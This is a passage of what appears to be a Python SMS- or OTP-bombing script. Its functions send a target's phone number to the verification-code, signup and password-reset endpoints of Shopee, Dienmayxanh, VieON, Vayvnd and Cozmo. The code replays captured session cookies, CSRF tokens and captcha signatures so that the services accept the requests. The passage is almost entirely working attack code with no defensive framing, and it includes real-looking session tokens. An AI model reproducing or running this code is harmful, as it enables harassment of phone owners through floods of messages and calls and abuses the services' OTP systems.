    }

    headers = {
        'authority': 'www.dienmayxanh.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.79323279.1695224590; _gid=GA1.2.1529897882.1695224590; _gat_UA-38936689-1=1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1695224590%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=ab30890ea397cc91.1695224590.; _pk_ses.8.8977=1; _fbp=fb.1.1695224590085.572828266; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ImUV2tmepFDqJx13sccnB7iwltpa-maVnaceJKMLO6cpG-aChNfJwcHotJlcS1fGrWlqfYdBaaySWu45hv_jO788Fw0QcFDyuEwQXaj2PpJZSfj02LESvNbY-NATGo5QEmq4j_k3OQ7OFSFIsu87r8; DMX_Personal=%7B%22UID%22%3A%22262eeb3254c80dd2df54459e5712395979b228c0%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; _ga_Y7SWKJEHCE=GS1.1.1695224589.1.1.1695224592.57.0.0; _ga=GA1.1.719063766.1695224590; SvID=dmxcart2737|ZQsTE|ZQsTD; _ga_5MXNSQHGT3=GS1.2.1695224590.1.1.1695224592.58.0.0; cebs=1; _ce.clock_event=1; _ce.clock_data=211%2C1.55.43.249%2C1%2C3357fadb0316939352bbdd4d5360a97f; cebsp_=1; _ce.s=v~bcd374843a146000bcdeb5f09c38c56c7448ab99~lcw~1695224601425~vpv~0~gtrk.la~lmrwyhy0~lcw~1695224601432',
        'origin': 'https://www.dienmayxanh.com',
        'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB6CENRTlKbrCHMoCjVxTPoRqxo4Jrei20gnA6VGFLq0Dv_ll1qKEsrkaZQrZQBnow2Q40_t3d9OCtFTVfUXRg0_2hUkaMrzxaLoVn6RunyFo7UhY2BK68xx_xDxsiitC50',
    }

    response = requests.post(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
def shoppe():
        cookies = {
            'SPC_F': 'a25s6jYEbKY5NmxEWD7qMYHiNfGiZ8dh',
            'REC_T_ID': '64549768-2197-11ee-8703-2cea7fa89bae',
            'SPC_R_T_ID': '0ORznR7JcaWnnU/Opr4VmPcGuxn18ftSYn3p/GmQDuF3qZuj37rh4He5nfvwh3Ngqa+7/bE92Dv84nSfLqZlj91vVVBSN2H9QJ0GsV1T0MgRGdY6W2lb+Btw1EcsdeAVJp1opi49cl9A0cPWh8VEKv6YcsOG2kKTmlciBB71WC8=',
            'SPC_R_T_IV': 'ajVoOTRNYXh6R2xBZHVNcw==',
            'SPC_T_ID': '0ORznR7JcaWnnU/Opr4VmPcGuxn18ftSYn3p/GmQDuF3qZuj37rh4He5nfvwh3Ngqa+7/bE92Dv84nSfLqZlj91vVVBSN2H9QJ0GsV1T0MgRGdY6W2lb+Btw1EcsdeAVJp1opi49cl9A0cPWh8VEKv6YcsOG2kKTmlciBB71WC8=',
            'SPC_T_IV': 'ajVoOTRNYXh6R2xBZHVNcw==',
            '_gcl_au': '1.1.2095773522.1689264461',
            '_fbp': 'fb.1.1689264461400.1533646108',
            '_hjSessionUser_868286': 'eyJpZCI6IjJmMTQ4ZDRhLTc1YzYtNWE2Mi05NGQ5LTRhZTM1ZjA2NjEzYyIsImNyZWF0ZWQiOjE2ODkyNjQ0NjQwODUsImV4aXN0aW5nIjp0cnVlfQ==',
            '_gcl_aw': 'GCL.1694957105.Cj0KCQjwx5qoBhDyARIsAPbMagAdMZgJD25oC_dXGQYZIcxvDaaiqMuhtNmHw0AGxxwcFg8xhYiiUFoaAoteEALw_wcB',
            '_gac_UA-61914164-6': '1.1694957108.Cj0KCQjwx5qoBhDyARIsAPbMagAdMZgJD25oC_dXGQYZIcxvDaaiqMuhtNmHw0AGxxwcFg8xhYiiUFoaAoteEALw_wcB',
            '_med': 'refer',
            'csrftoken': 'RZl3uzmGkMZrKlBbW8rSFDxDv5xJYl6Y',
            'SPC_SI': '2C8AZQAAAABjRHZ5VHJQd+g1VQAAAAAAU3JUR1dOOEg=',
            '_QPWSDCXHZQA': 'b48d0c78-dbf6-44b9-c16d-2a0f1d495bf3',
            'REC7iLP4Q': '86706504-6a77-4cfc-8550-fe9dd6680d78',
            'AMP_TOKEN': '%24NOT_FOUND',
            '_gid': 'GA1.2.1532219803.1695223179',
            '_dc_gtm_UA-61914164-6': '1',
            '_ga': 'GA1.1.10628481.1689264463',
            'shopee_webUnique_ccd': 'GGFT9JRLHZ1%2BlMBZ6NuowQ%3D%3D%7Cyp5KV1CiVEPMEOcQZNQT0OfcalXU4zz9rJlhGB4eW7HaLrG5Trqfcdc%2FnMfdx70Cc%2BgexMC45sI%3D%7CctJErb5iDBXDQ0ly%7C08%7C3',
            'ds': 'ab5c100c4f8474233992583a20da5b76',
            '_ga_M32T05RVZT': 'GS1.1.1695225379.17.1.1695225394.45.0.0',
        }

        headers = {
            'authority': 'shopee.vn',
            'accept': 'application/json',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'af-ac-enc-sz-token': 'GGFT9JRLHZ1+lMBZ6NuowQ==|yp5KV1CiVEPMEOcQZNQT0OfcalXU4zz9rJlhGB4eW7HaLrG5Trqfcdc/nMfdx70Cc+gexMC45sI=|ctJErb5iDBXDQ0ly|08|3',
            'content-type': 'application/json',
            # 'cookie': 'SPC_F=a25s6jYEbKY5NmxEWD7qMYHiNfGiZ8dh; REC_T_ID=64549768-2197-11ee-8703-2cea7fa89bae; SPC_R_T_ID=0ORznR7JcaWnnU/Opr4VmPcGuxn18ftSYn3p/GmQDuF3qZuj37rh4He5nfvwh3Ngqa+7/bE92Dv84nSfLqZlj91vVVBSN2H9QJ0GsV1T0MgRGdY6W2lb+Btw1EcsdeAVJp1opi49cl9A0cPWh8VEKv6YcsOG2kKTmlciBB71WC8=; SPC_R_T_IV=ajVoOTRNYXh6R2xBZHVNcw==; SPC_T_ID=0ORznR7JcaWnnU/Opr4VmPcGuxn18ftSYn3p/GmQDuF3qZuj37rh4He5nfvwh3Ngqa+7/bE92Dv84nSfLqZlj91vVVBSN2H9QJ0GsV1T0MgRGdY6W2lb+Btw1EcsdeAVJp1opi49cl9A0cPWh8VEKv6YcsOG2kKTmlciBB71WC8=; SPC_T_IV=ajVoOTRNYXh6R2xBZHVNcw==; _gcl_au=1.1.2095773522.1689264461; _fbp=fb.1.1689264461400.1533646108; _hjSessionUser_868286=eyJpZCI6IjJmMTQ4ZDRhLTc1YzYtNWE2Mi05NGQ5LTRhZTM1ZjA2NjEzYyIsImNyZWF0ZWQiOjE2ODkyNjQ0NjQwODUsImV4aXN0aW5nIjp0cnVlfQ==; _gcl_aw=GCL.1694957105.Cj0KCQjwx5qoBhDyARIsAPbMagAdMZgJD25oC_dXGQYZIcxvDaaiqMuhtNmHw0AGxxwcFg8xhYiiUFoaAoteEALw_wcB; _gac_UA-61914164-6=1.1694957108.Cj0KCQjwx5qoBhDyARIsAPbMagAdMZgJD25oC_dXGQYZIcxvDaaiqMuhtNmHw0AGxxwcFg8xhYiiUFoaAoteEALw_wcB; _med=refer; csrftoken=RZl3uzmGkMZrKlBbW8rSFDxDv5xJYl6Y; SPC_SI=2C8AZQAAAABjRHZ5VHJQd+g1VQAAAAAAU3JUR1dOOEg=; _QPWSDCXHZQA=b48d0c78-dbf6-44b9-c16d-2a0f1d495bf3; REC7iLP4Q=86706504-6a77-4cfc-8550-fe9dd6680d78; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.1532219803.1695223179; _dc_gtm_UA-61914164-6=1; _ga=GA1.1.10628481.1689264463; shopee_webUnique_ccd=GGFT9JRLHZ1%2BlMBZ6NuowQ%3D%3D%7Cyp5KV1CiVEPMEOcQZNQT0OfcalXU4zz9rJlhGB4eW7HaLrG5Trqfcdc%2FnMfdx70Cc%2BgexMC45sI%3D%7CctJErb5iDBXDQ0ly%7C08%7C3; ds=ab5c100c4f8474233992583a20da5b76; _ga_M32T05RVZT=GS1.1.1695225379.17.1.1695225394.45.0.0',
            'origin': 'https://shopee.vn',
            'referer': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2Flist%2Fyoosee',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-api-source': 'pc',
            'x-csrftoken': 'RZl3uzmGkMZrKlBbW8rSFDxDv5xJYl6Y',
            'x-requested-with': 'XMLHttpRequest',
            'x-shopee-language': 'vi',
            'x-sz-sdk-version': '3.0.0-2&1.5.1',
        }

        json_data = {
            'phone': '84'+phone[1:11],
            'force_channel': True,
            'm_token': '',
            'captcha_signature': '4b731cca7557e1e9c8e159d95fe70daa085ac571df24b791e0de2c92d81ae081508be8e66ea07f3e156b58bfc376843fb7b31d79ebbe8302923c64e5ad9fa22ad8c39b48b15bbbce098460e08d77f7fc3387df3ccfed0b224342720378fd7301f9a9b4a831fef06f1b3cc1af3e478e8c51d8b035c2a9c67dd29d5434204a5b6a88e2ac5d4965c0a5e889ec7cddff75727d1400348670d5bcd20c7524ea05acf0337ae3b312c11f9ffcb9ea0c77732559c5a04eaacf70fc635b7dd73492b47120b5674739d686576b631f9c59176ee3a65e6fe6bca76da4fe8ce4277a327ab01d5ac576da83dbb0fc33ce39e95fa1a7581867423b932129340f34b9bf4a14f11bb23638fb7a7445a12da4cb90df72a3db3976ad708abd51057381db53ac51312903b7911cf3db3b74a978f09c56fb994210e2fd96647a94db0de60993c82a5b5a1c4cbf364a4fa321ab9beb0260491f8dbb6cb4c41a38addaf08e0d6353def7597adb575c1d72c17c41a8d68bac58688dddd13694d4c726cbfb032efe6486bdf715924fc275a0f8439f592eff08900f246a186c72df91da73e8645da6a95bdb0fafc737c39f63964dc91f69680bfd5386ec384f8cf72512c3e15320241b857792ce6b3c47b7ac43',
            'operation': 8,
            'channel': 1,
            'supported_channels': [
                1,
                2,
                3,
                6,
                0,
                5,
            ],
            'support_session': True,
        }
        response = requests.post('https://shopee.vn/api/v4/otp/send_vcode', cookies=cookies, headers=headers, json=json_data)
###
def call():
    cookies = {
        'csrftoken': 'XYBfRSaS4AdZ5SHbtoNNYPvLbivnUXdZ',
        'REC_T_ID': '587bf38d-5c76-11ee-a0ec-7a909fdeaff7',
        'SPC_R_T_ID': 'Xwo6IHWc81/PEQa0YYuGhVJLDFyMJ9taLPBlielKdEDxCDkz0VPWNXGwdFqhwJYZ056eKdsmI/ZFF3IRt/naxO4VnQwIMlcRgAZEP3MYE1nDcM2UyY+fiUQ0dehbyf+lqx/hO8n7L10rsV6hg/m+l5V3a/F339GCYOuaKSD83N8=',
        'SPC_R_T_IV': 'WlBHTDdiRWNOd2hNYmZTQw==',
        'SPC_T_ID': 'Xwo6IHWc81/PEQa0YYuGhVJLDFyMJ9taLPBlielKdEDxCDkz0VPWNXGwdFqhwJYZ056eKdsmI/ZFF3IRt/naxO4VnQwIMlcRgAZEP3MYE1nDcM2UyY+fiUQ0dehbyf+lqx/hO8n7L10rsV6hg/m+l5V3a/F339GCYOuaKSD83N8=',
        'SPC_T_IV': 'WlBHTDdiRWNOd2hNYmZTQw==',
        'SPC_SI': '/4gSZQAAAABFMkZLcDRVSPx6AgAAAAAAU3Bod0dzOEw=',
        'SPC_F': 'GKWhYRf41wAd8t5Swq5xRa7jtaaixQk5',
        '_gcl_au': '1.1.1925485528.1695737387',
        '_fbp': 'fb.1.1695737389173.100701391',
        '_QPWSDCXHZQA': 'f92b1fc5-ee68-458a-b2d6-a4e4fa392047',
        'REC7iLP4Q': '0b4277f2-88c3-4891-bd0d-11279662f619',
        '_hjSessionUser_868286': 'eyJpZCI6ImYxOGI2MDJhLWMwMzgtNTA3Mi04MDllLWJkOTRkYTlkYTNhZCIsImNyZWF0ZWQiOjE2OTU3MzczOTA0MTUsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_868286': '0',
        '_hjSession_868286': 'eyJpZCI6IjUwMTkyODhhLTQ4ODktNDYyNi05MjlhLWMwY2ZkMDc4MDQwZSIsImNyZWF0ZWQiOjE2OTU3MzczOTA0MTYsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '1',
        'AMP_TOKEN': '%24NOT_FOUND',
        '_gid': 'GA1.2.844527436.1695737391',
        '_dc_gtm_UA-61914164-6': '1',
        '_ga': 'GA1.1.1731815068.1695737390',
        'shopee_webUnique_ccd': '7B7qNvCXa%2F6cI4c7BtfDsA%3D%3D%7CTWfuhVNmWVxUziCXrWWGxg3Q13mILCJpa8OwJ2ZBuaZBlZ5bYWwVUi2L%2BzpX3ed3ZZIh8IxD%2BRp6MA%3D%3D%7Cr6Js7p7rNUhv9eM4%7C08%7C3',
        'ds': '7bd8c7ab4975594c9e819f13f2eaaed6',
        '_ga_M32T05RVZT': 'GS1.1.1695737390.1.1.1695737431.19.0.0',
    }

    headers = {
        'authority': 'shopee.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9',
        'af-ac-enc-sz-token': '7B7qNvCXa/6cI4c7BtfDsA==|TWfuhVNmWVxUziCXrWWGxg3Q13mILCJpa8OwJ2ZBuaZBlZ5bYWwVUi2L+zpX3ed3ZZIh8IxD+Rp6MA==|r6Js7p7rNUhv9eM4|08|3',
        'content-type': 'application/json',
        # 'cookie': 'csrftoken=XYBfRSaS4AdZ5SHbtoNNYPvLbivnUXdZ; REC_T_ID=587bf38d-5c76-11ee-a0ec-7a909fdeaff7; SPC_R_T_ID=Xwo6IHWc81/PEQa0YYuGhVJLDFyMJ9taLPBlielKdEDxCDkz0VPWNXGwdFqhwJYZ056eKdsmI/ZFF3IRt/naxO4VnQwIMlcRgAZEP3MYE1nDcM2UyY+fiUQ0dehbyf+lqx/hO8n7L10rsV6hg/m+l5V3a/F339GCYOuaKSD83N8=; SPC_R_T_IV=WlBHTDdiRWNOd2hNYmZTQw==; SPC_T_ID=Xwo6IHWc81/PEQa0YYuGhVJLDFyMJ9taLPBlielKdEDxCDkz0VPWNXGwdFqhwJYZ056eKdsmI/ZFF3IRt/naxO4VnQwIMlcRgAZEP3MYE1nDcM2UyY+fiUQ0dehbyf+lqx/hO8n7L10rsV6hg/m+l5V3a/F339GCYOuaKSD83N8=; SPC_T_IV=WlBHTDdiRWNOd2hNYmZTQw==; SPC_SI=/4gSZQAAAABFMkZLcDRVSPx6AgAAAAAAU3Bod0dzOEw=; SPC_F=GKWhYRf41wAd8t5Swq5xRa7jtaaixQk5; _gcl_au=1.1.1925485528.1695737387; _fbp=fb.1.1695737389173.100701391; _QPWSDCXHZQA=f92b1fc5-ee68-458a-b2d6-a4e4fa392047; REC7iLP4Q=0b4277f2-88c3-4891-bd0d-11279662f619; _hjSessionUser_868286=eyJpZCI6ImYxOGI2MDJhLWMwMzgtNTA3Mi04MDllLWJkOTRkYTlkYTNhZCIsImNyZWF0ZWQiOjE2OTU3MzczOTA0MTUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_868286=0; _hjSession_868286=eyJpZCI6IjUwMTkyODhhLTQ4ODktNDYyNi05MjlhLWMwY2ZkMDc4MDQwZSIsImNyZWF0ZWQiOjE2OTU3MzczOTA0MTYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.844527436.1695737391; _dc_gtm_UA-61914164-6=1; _ga=GA1.1.1731815068.1695737390; shopee_webUnique_ccd=7B7qNvCXa%2F6cI4c7BtfDsA%3D%3D%7CTWfuhVNmWVxUziCXrWWGxg3Q13mILCJpa8OwJ2ZBuaZBlZ5bYWwVUi2L%2BzpX3ed3ZZIh8IxD%2BRp6MA%3D%3D%7Cr6Js7p7rNUhv9eM4%7C08%7C3; ds=7bd8c7ab4975594c9e819f13f2eaaed6; _ga_M32T05RVZT=GS1.1.1695737390.1.1.1695737431.19.0.0',
        'origin': 'https://shopee.vn',
        'referer': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-api-source': 'pc',
        'x-csrftoken': 'XYBfRSaS4AdZ5SHbtoNNYPvLbivnUXdZ',
        'x-requested-with': 'XMLHttpRequest',
        'x-shopee-language': 'vi',
        'x-sz-sdk-version': '3.0.0-2&1.5.1',
    }

    json_data = {
        'phone': phone,
        'force_channel': True,
        'm_token': '',
        'captcha_signature': '326e24bd847b24bd9544c582c86b6cb73d3836fcecc385d695f4cc25e80fb8e997a0dfd01354fd1d77885b15084399483d20993afba3a7a531a255af6da6d3248cf373d53bdda8e58184e5b06610382b258ac075d1367301160dbdf80309c4c7366cb1723f0c31e1b03394678ce45df8e7777acf6868db1d7eebf9c975d612d186900394a35d2289221429228d1f55c11ae5c1699afc6d6649589d2ed8fbd2b025f23a4459060c2ba40570ad143714d0568d82637c4045277596bab252f39068830faf65802fd8ef373e656a80ccc842ab72f37e5302a7578999db822c6017bf95aa4fe27225dcbba8a002fb4c8da0564aed4cdde0f76f8e925e0d6f724521c9cb8da2dd2b97f60778aac83b73d36712ecbc7a35d0ec450beccf3fe285cd89aab587e734fd4c1da292b627826de1e285971e33c4135b7d45306b0b5fb050d04a43e9cd83f94adee7a892c08d65878fc9b2484fe6e8829b5a83ee90883878c82b8cb81d439a267ce70c62ff04053c3cf95048b3a501c6df48a424c9c69fb7fbd140da5a9cadcadd03faa33952d9de7dbf46dd65abd995689f44b9417d89c19bf9b168aac6bcf66b01b75279162bc69e95c46a2793edcc9deeaf32e5edceb1087129b097c7c0f4c25c006071',
        'operation': 8,
        'channel': 2,
        'supported_channels': [
            1,
            2,
            3,
            6,
            0,
            5,
        ],
        'support_session': True,
    }

    response = requests.post('https://shopee.vn/api/v4/otp/send_vcode', cookies=cookies, headers=headers, json=json_data)
###
def vieon():
  data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
}
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
###
def dongcre():
    cookies = {
        '_gcl_au': '1.1.537834945.1695554309',
        '_ga_P2783EHVX2': 'GS1.1.1695554309.1.0.1695554309.60.0.0',
        '_ga': 'GA1.2.333182544.1695554309',
        '_gid': 'GA1.2.453023338.1695554309',
        '_gat_UA-151110385-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'cOcPPAKWsNLhjk0CSMjFJTbLsv8',
        '_fbp': 'fb.1.1695554309566.491269602',
        '_ym_uid': '1695554311323945442',
        '_ym_d': '1695554311',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.537834945.1695554309; _ga_P2783EHVX2=GS1.1.1695554309.1.0.1695554309.60.0.0; _ga=GA1.2.333182544.1695554309; _gid=GA1.2.453023338.1695554309; _gat_UA-151110385-1=1; _tt_enable_cookie=1; _ttp=cOcPPAKWsNLhjk0CSMjFJTbLsv8; _fbp=fb.1.1695554309566.491269602; _ym_uid=1695554311323945442; _ym_d=1695554311; _ym_isad=2; _ym_visorc=w',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'login': phone,
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
###
def call1():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6Im1xYnFtb1dMcmhPVHBnQmJadnJFaEE9PSIsInZhbHVlIjoiMjNSSFZMTWNPaWtjaU9nVmZIbUhROGNyMGhXTmdVOEI4a2ZhSnFqL0Q5NFlrS3VNdWI1MEtzTWNxSyszUTlUTmcvMzRaaktJemRTVWowb2tqY2FuZ2diTlRXVlY1S251bVVDcDhidEY0bWRuN2lObDlBaFU3bFBnYVpmTmptWWEiLCJtYWMiOiIxMGYyYWRmYzU4YTc0M2M5OTYzNjY0MzZhNzVmYjI0Mzg0OTUxMWU2MjVkMmM4NTg5OTJiMjc1NWNiNjc4NGYyIiwidGFnIjoiIn0%3D',
        'cozmomoney_session': 'l2Xv1EP4GHDDRJb6tM4iyID4UV47GKlPYH0Wuk5R',
        'data': '5afc04a87b626d97d65dda355dab3c6f',
        '_gcl_au': '1.1.1780075340.1695456554',
        '_ga': 'GA1.1.259766228.1695456554',
        '_fbp': 'fb.1.1695456554222.1573976137',
        '_hjSessionUser_3309000': 'eyJpZCI6IjIwYTVjOTY5LWQ0YjAtNTBkOC04ZGVlLTYzMTg3Y2ZjNDkzZCIsImNyZWF0ZWQiOjE2OTU0NTY1NTQ0OTAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_3309000': '0',
        '_hjSession_3309000': 'eyJpZCI6Ijk2YTUyNGJiLTBmZTktNDdiNS05N2YxLTYxNmI0YjJiMzc2NCIsImNyZWF0ZWQiOjE2OTU0NTY1NTQ0OTEsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '_clck': '1jxu7ci|2|ff9|0|1361',
        '_ym_uid': '1695456556430741280',
        '_ym_d': '1695456556',
        '_clsk': '1c85dj5|1695456556106|1|1|q.clarity.ms/collect',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        '_ga_BN3G2QNZ4H': 'GS1.1.1695456554.1.1.1695456684.0.0.0',
        '_ga_JNZEYP87KL': 'GS1.1.1695456554.1.1.1695456684.0.0.0',
    }

    headers = {
        'authority': 'cozmo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6Im1xYnFtb1dMcmhPVHBnQmJadnJFaEE9PSIsInZhbHVlIjoiMjNSSFZMTWNPaWtjaU9nVmZIbUhROGNyMGhXTmdVOEI4a2ZhSnFqL0Q5NFlrS3VNdWI1MEtzTWNxSyszUTlUTmcvMzRaaktJemRTVWowb2tqY2FuZ2diTlRXVlY1S251bVVDcDhidEY0bWRuN2lObDlBaFU3bFBnYVpmTmptWWEiLCJtYWMiOiIxMGYyYWRmYzU4YTc0M2M5OTYzNjY0MzZhNzVmYjI0Mzg0OTUxMWU2MjVkMmM4NTg5OTJiMjc1NWNiNjc4NGYyIiwidGFnIjoiIn0%3D; cozmomoney_session=l2Xv1EP4GHDDRJb6tM4iyID4UV47GKlPYH0Wuk5R; data=5afc04a87b626d97d65dda355dab3c6f; _gcl_au=1.1.1780075340.1695456554; _ga=GA1.1.259766228.1695456554; _fbp=fb.1.1695456554222.1573976137; _hjSessionUser_3309000=eyJpZCI6IjIwYTVjOTY5LWQ0YjAtNTBkOC04ZGVlLTYzMTg3Y2ZjNDkzZCIsImNyZWF0ZWQiOjE2OTU0NTY1NTQ0OTAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3309000=0; _hjSession_3309000=eyJpZCI6Ijk2YTUyNGJiLTBmZTktNDdiNS05N2YxLTYxNmI0YjJiMzc2NCIsImNyZWF0ZWQiOjE2OTU0NTY1NTQ0OTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _clck=1jxu7ci|2|ff9|0|1361; _ym_uid=1695456556430741280; _ym_d=1695456556; _clsk=1c85dj5|1695456556106|1|1|q.clarity.ms/collect; _ym_isad=2; _ym_visorc=w; _ga_BN3G2QNZ4H=GS1.1.1695456554.1.1.1695456684.0.0.0; _ga_JNZEYP87KL=GS1.1.1695456554.1.1.1695456684.0.0.0',
        'origin': 'https://cozmo.vn',
        'referer': 'https://cozmo.vn/?clickid=NsCSqxKEEnIb6nVgAq5w7TdD8JrZY13xArmo0WshRX2cwIWs&utm_campaign=cps&utm_content=932508&utm_source=accesstrade_cps&utm_medium=affiliate&smart_link_redirect=1&atnct1=bf2fb7d1825a1df3ca308ad0bf48591e&atnct2=NsCSqxKEEnIb6nVgAq5w7TdD8JrZY13xArmo0WshRX2cwIWs&atnct3=A3Nc1000cw300jzj0',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-xsrf-token': 'eyJpdiI6Im1xYnFtb1dMcmhPVHBnQmJadnJFaEE9PSIsInZhbHVlIjoiMjNSSFZMTWNPaWtjaU9nVmZIbUhROGNyMGhXTmdVOEI4a2ZhSnFqL0Q5NFlrS3VNdWI1MEtzTWNxSyszUTlUTmcvMzRaaktJemRTVWowb2tqY2FuZ2diTlRXVlY1S251bVVDcDhidEY0bWRuN2lObDlBaFU3bFBnYVpmTmptWWEiLCJtYWMiOiIxMGYyYWRmYzU4YTc0M2M5OTYzNjY0MzZhNzVmYjI0Mzg0OTUxMWU2MjVkMmM4NTg5OTJiMjc1NWNiNjc4NGYyIiwidGFnIjoiIn0=',
    }

    json_data = {
        'mobile': phone[0:4]+'-'+phone[4:7]+'-'+phone[7:10],
        'type': 'web',
    }

    response = requests.post('https://cozmo.vn/api/request-otp', cookies=cookies, headers=headers, json=json_data)
###
def call2():
    cookies = {
        'CaptchaCookieKey': '0',
        'ASP.NET_SessionId': 'hcmz4hgdpxebkega4oelv22w',
        'language': 'vi',
        'RequestData': '7d329d0f-bd34-4f04-a146-11c2e947a6ea',
        'UserTypeMarketing': 'L0',
        '_gid': 'GA1.2.63309620.1695661050',
        '__sbref': 'jcliwyxlufjtnwoeadraidatfernbmkgiaccsnti',
        'UserMachineId_png': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
